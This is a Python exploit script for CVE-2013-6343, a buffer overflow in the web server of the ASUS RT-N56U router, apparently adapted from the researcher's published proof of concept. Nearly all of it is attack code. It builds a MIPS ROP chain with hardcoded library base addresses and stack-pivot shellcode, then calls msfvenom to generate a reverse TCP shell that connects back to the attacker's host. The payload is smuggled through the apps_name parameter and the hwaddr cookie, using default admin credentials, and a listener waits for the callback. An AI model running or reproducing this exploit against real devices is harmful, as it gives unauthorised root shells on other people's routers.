#!/usr/bin/env python
import subprocess
from time import sleep
from sys import exit
from threading import Lock, Thread
from random import seed, randint
import urllib2, struct, base64, socket, argparse, os, binascii

# [*] Title: ASUS RT-N56U Remote Root Shell Exploit - apps_name
# [*] Discovered and Reported: October 2013
# [*] Discovered/Exploited By: Jacob Holcomb/Gimppy - Security Analyst @ ISE 
# [*] Contact: Twitter - @rootHak42
# [*] Software Vendor: http://asus.com
# [*] Exploit/Advisory: http://securityevaluators.com, http://infosec42.blogspot.com/
# [*] Software: httpd (Listens on TCP/80 and TCP/443)
# [*] Tested Firmware Versions: 3.0.0.4.374_979 (Other versions may be vulnerable)
# [*] CVE: ASUS RT-N56U Buffer Overflow: CVE-2013-6343
#
# [*] Overview:
#       Multiple ASUS routers including the RT-N56U and RT-AC66U have the ability to install
#       supplemental applications. This install process is handled by the routers web server,
#       and is susceptible to multiple Buffer Overflow attacks.
#
#       Vulnerable Web Page: APP_Installation.asp 
#       Vulnerable HTML Parameters: apps_name, apps_flag
#       Vulneralbe Source File: web.c of httpd code
#       *Firmware versions prior to the tested version were vulnerable to this attack.
#

# global var to see if the exploit was successful
# success = False
# lock = Lock()

target = ''

# TCP socket to catch the callback from a successful exploit
def listenSocket(port):
    try:
        ip = get_ip()
        socket.setdefaulttimeout(30)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((ip, port))
        s.listen(1)

        conn, addr = s.accept()

        if conn:
            s.close()
            print "{target}:asus_RTN56U_exploit".format(target=target)
            os.exit(0)

    except socket.timeout:
        s.close()
        print "Fail socket timed out"
        os._exit(1)

    # except Exception:
    #     print "Something weird. Failing"
    #     os._exit(1)


def basicAuth(user, passw):
    return base64.encodestring("%s:%s" % (user, passw)).replace("\n", "")


# hacky way to get IP address
def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('1.1.1.1', 1))
        IP = s.getsockname()[0]
    except:
        IP = '0.0.0.0'
    finally:
        s.close()
    return IP


def main():

    #      print """\n[*] Title: ASUS RT-N56U Remote Root Shell Exploit - apps_name
    # [*] Discovered and Reported: October 2013
    # [*] Discovered/Exploited By: Jacob Holcomb/Gimppy - Security Analyst @ ISE
    # [*] Contact: Twitter - @rootHak42
    # [*] Software Vendor: http://asus.com
    # [*] Exploit/Advisory: http://securityevaluators.com, http://infosec42.blogspot.com/
    # [*] Software: httpd (Listens on TCP/80 and TCP/443)
    # [*] Tested Firmware Versions: 3.0.0.4.374_979 (Other versions may be vulnerable)
    # [*] CVE: ASUS RT-N56U Buffer Overflow: CVE-2013-6343\n"""

    # parse args
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", help="Target URL to attack", required=True)
    parser.add_argument("--user", help="Username on target", required=False)
    parser.add_argument("--passw", help="Password on target", required=False)
    args = parser.parse_args()
    global target
    target = "http://" + args.target
    user = args.user if args.user else "admin"
    passw = args.passw if args.passw else "admin"

    port = randint(10000, 10500)

    try:
        netSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = target[7:]
        port = 80
        finger = "RT-N56U"

        print "host is %s" % host

    except Exception as error:
        print "\n [!!!] ERROR! %s %s [!!!]\n\n" % (type(error), error)
        exit(1)

    auth = basicAuth(user, passw)
    junk = "\x42" * 109
    link_nop = "2Aa3"

    #Base address of ld_uClibc and libc in httpd address space
    ld_uClibcBase = 0x2aaa8000
    libcBaseAddr = 0x2ab5f000

    #Rop Chain
    #<chown+68>:   move    v0,s0 -> sched_yield()
    #<chown+72>:   lw  ra,28(sp) -> Rop2
    #<chown+76>:   lw  s0,24(sp)
    #<chown+80>:   jr  ra
    #<chown+84>:   addiu   sp,sp,32
    saved_ra1 = struct.pack("<L", libcBaseAddr + 0x73f4)

    #<_dl_runtime_pltresolve+68>:  lw  ra,36(sp) -> Rop 3
    #<_dl_runtime_pltresolve+72>:  lw  a0,16(sp)
    #<_dl_runtime_pltresolve+76>:  lw  a1,20(sp)
    #<_dl_runtime_pltresolve+80>:  lw  a2,24(sp)
    #<_dl_runtime_pltresolve+84>:  lw  a3,28(sp)
    #<_dl_runtime_pltresolve+88>:  addiu   sp,sp,40
    #<_dl_runtime_pltresolve+92>:  move    t9,v0
    #<_dl_runtime_pltresolve+96>:  jr  t9 -> jump sched_yield()
    #<_dl_runtime_pltresolve+100>: nop
    saved_ra2 = struct.pack("<L", ld_uClibcBase + 0x4e94)

    #<setrlimit64+144>:    addiu   a1,sp,24 -> ptr to stack
    #<setrlimit64+148>:    lw  gp,16(sp)
    #<setrlimit64+152>:    lw  ra,32(sp) -> Rop 4
    #<setrlimit64+156>:    jr  ra -> jump Rop 4
    #<setrlimit64+160>:    addiu   sp,sp,40
    saved_ra3 = struct.pack("<L", libcBaseAddr + 0x9ce0)

    #move    t9,a1 -> ptr to jalr sp on stack
    #addiu   a0,a0,56
    #jr      t9 -> jump to stack
    #move    a1,a2
    saved_ra4 = struct.pack("<L", libcBaseAddr + 0x308fc)

    #sched_yield()
    sch_yield_s0 = struct.pack("<L", libcBaseAddr + 0x94b0)
   
    #Stage 1 Shellcode 
    jalr_sp =  "\x09\xf8\xa0\x03"

    #Stage 2 Shellcode (Stack Pivot) by Jacob Holcomb of ISE
    stg2_SC = "\x2c\x08\xbd\x27"# addiu sp, sp, 2092
    stg2_SC += "\x09\xf8\xa0\x03"# jalr sp
    stg2_SC += "\x32\x41\x61"#filler for link (branch delay)

    #Stage 3 Shellcode
    ip = get_ip()
    # generate shellcode to call back
    cmd = "msfvenom -p linux/mipsle/shell_reverse_tcp lport=%s lhost=%s -f hex -o shellcode" % (6969, ip)
    cmd = cmd.split(' ')
    subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
    # os.system(cmd)
    # sleep(5) # wait for msf to finish

    try:
        f = open("shellcode", 'r')
    except IOError as e:
        print e
        exit(1)

    # convert hex to ascii to send via exploit
    string = f.read()
    stg3_SC = binascii.unhexlify(string)

    # starting up tcp socket server to see if exploit succeeds
    server = Thread(target=listenSocket, args=(6969,))
    server.daemon = True
    server.start()

    # prepare payload
    payload =  junk + sch_yield_s0 + junk[0:12] + saved_ra1 + junk[0:32]
    payload += saved_ra2 + junk[0:36] + saved_ra3 + junk[0:24] + jalr_sp
    payload += link_nop + saved_ra4 + junk[0:4] + stg2_SC
    postData = "apps_action=install&apps_path=&apps_name=%s&apps_flag=sdb1" % payload

    try:
        # print "\n [*] Preparing the malicious web request."
        httpRequest = urllib2.Request("%s/APP_Installation.asp" % target, data = postData)
        httpRequest.add_header("Cookie", "hwaddr=" + junk[0:35] + stg3_SC + "\x42" * (265 - len(stg3_SC)))
        if auth != 0:
            httpRequest.add_header("Authorization", "Basic %s" % auth)
        # print " [*] Successfully built HTTP POST request."

    except Exception as error:
        print "\n [!!!] ERROR! %s %s [!!!]\n\n" % (type(error), error)
        exit(1)

    try:
        sploit = urllib2.urlopen(httpRequest, None, 6)

        server.join()


    except(urllib2.URLError) as error:
        print "\n [!!!] Web request error! %s %s [!!!]\n\n" % (type(error), error)
        exit(1)
    except Exception as error:
        print "\n [!!!] ERROR! %s %s [!!!]\n\n" % (type(error), error)
        exit(1)
    finally:
        print " [*] %s exploit code has finished.\n" % finger
        # exit(1)

if __name__ == "__main__":
    main()